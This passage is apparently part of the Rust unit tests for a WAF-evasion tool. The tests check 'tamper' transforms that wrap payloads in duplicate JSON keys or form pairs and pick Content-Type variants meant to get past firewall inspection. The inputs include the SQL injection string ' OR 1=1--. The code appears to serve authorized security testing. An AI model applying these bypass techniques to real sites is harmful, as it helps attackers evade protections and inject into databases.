        assert!(out.contains("\\t"));
        // BEL (0x07) must be .
        assert!(out.contains("\\u0007"), "BEL not escaped to \\u0007: {out}");
        // Still round-trips through serde_json.
        let _: serde_json::Value = serde_json::from_str(&out).expect("valid JSON");
    }

    #[test]
    fn json_dup_key_handles_empty_payload() {
        let t = JsonDupKeyTamper;
        let out = t.tamper("", None);
        // Empty payload is fine — both keys present, second value
        // is empty string.
        assert_eq!(out, "{\"q\":\"safe\",\"q\":\"\"}");
    }

    #[test]
    fn json_dup_key_name_and_aggressiveness_within_bounds() {
        let t = JsonDupKeyTamper;
        assert_eq!(t.name(), "json_dup_key");
        let a = t.aggressiveness();
        assert!((0.0..=1.0).contains(&a), "aggressiveness out of range: {a}");
    }

    #[test]
    fn json_dup_key_is_registered_in_default_registry() {
        // Anti-regression: forgetting to add the tamper to
        // DEFAULT_NAMES + the with_defaults match arm is silent —
        // the tamper exists but can't be selected via `--only`.
        // This test pins the wiring.
        let registry = crate::tamper::TamperRegistry::with_defaults();
        assert!(
            registry.get("json_dup_key").is_some(),
            "json_dup_key must be in TamperRegistry::with_defaults()"
        );
    }

    // ── CtStarvationTamper (frontier 2026 / WAFFLED + windshock) ──

    #[test]
    fn ct_starvation_wraps_body_context_in_form_pair() {
        let t = CtStarvationTamper;
        let out = t.tamper("' OR 1=1--", Some("body"));
        assert_eq!(out, "q=' OR 1=1--");
    }

    #[test]
    fn ct_starvation_handles_form_json_multipart_contexts() {
        let t = CtStarvationTamper;
        for ctx in ["body", "form", "json", "multipart"] {
            assert_eq!(
                t.tamper("X", Some(ctx)),
                "q=X",
                "context {ctx} must produce form-pair wrap"
            );
        }
    }

    #[test]
    fn ct_starvation_is_no_op_for_header_and_query_contexts() {
        // The tamper has no leverage in header / cookie carriers;
        // returning the payload unchanged is honest behaviour
        // (operator selecting --target-context header gets a
        // no-op variant they can spot in --explain).
        let t = CtStarvationTamper;
        assert_eq!(t.tamper("X", Some("header")), "X");
        assert_eq!(t.tamper("X", Some("cookie")), "X");
        assert_eq!(t.tamper("X", Some("query")), "X");
        assert_eq!(t.tamper("X", None), "X");
    }

    #[test]
    fn ct_starvation_header_for_returns_one_of_known_variants() {
        // Hash-based dispatch must produce a deterministic output
        // from the documented set. Anti-regression: silently
        // emitting "application/json" (canonical, no bypass) would
        // defeat the entire point of the tamper.
        const ALLOWED: &[&str] = &[
            "APPLICATION/JSON",
            "Application/Json",
            "application/json; charset=ibm037",
            "text/plain",
            "application/x-www-form-urlencoded",
        ];
        for p in ["a", "longer-payload", "' OR 1=1--", ""] {
            let ct = ct_starvation_header_for(p);
            assert!(
                ALLOWED.contains(&ct),
                "header for {p:?} not in known-effective set: {ct}"
            );
        }
    }

    #[test]
    fn ct_starvation_header_for_is_stable_per_payload() {
        // Two calls with the same payload must return the same
        // header — debugging-friendly: an operator who re-runs a
        // failing case gets the same Content-Type advertised.
        for p in ["x", "very long payload bytes here"] {
            let a = ct_starvation_header_for(p);
            let b = ct_starvation_header_for(p);
            assert_eq!(a, b, "ct_starvation_header_for not stable for {p:?}");
        }
    }

    #[test]
    fn ct_starvation_is_registered_in_default_registry() {
        let registry = crate::tamper::TamperRegistry::with_defaults();
        assert!(
            registry.get("ct_starvation").is_some(),
            "ct_starvation must be in TamperRegistry::with_defaults()"
        );
    }

    #[test]
    fn json_escape_string_matches_serde_json_for_unicode() {
        // The escape helper is hand-rolled; verify it doesn't
        // diverge from serde_json's output for benign Unicode (no
        // double-escape, no missing escapes). Pure-ASCII fast path.
        for raw in ["plain ASCII", "café", "日本語", "🔥"] {
            let ours = json_escape_string(raw);
            // Round-trip through serde_json by wrapping in quotes.
            let wrapped = format!("\"{ours}\"");
            let parsed: String = serde_json::from_str(&wrapped)
                .unwrap_or_else(|e| panic!("our escape of {raw:?} fails JSON parse: {e}"));
            assert_eq!(parsed, raw);
        }
    }
}
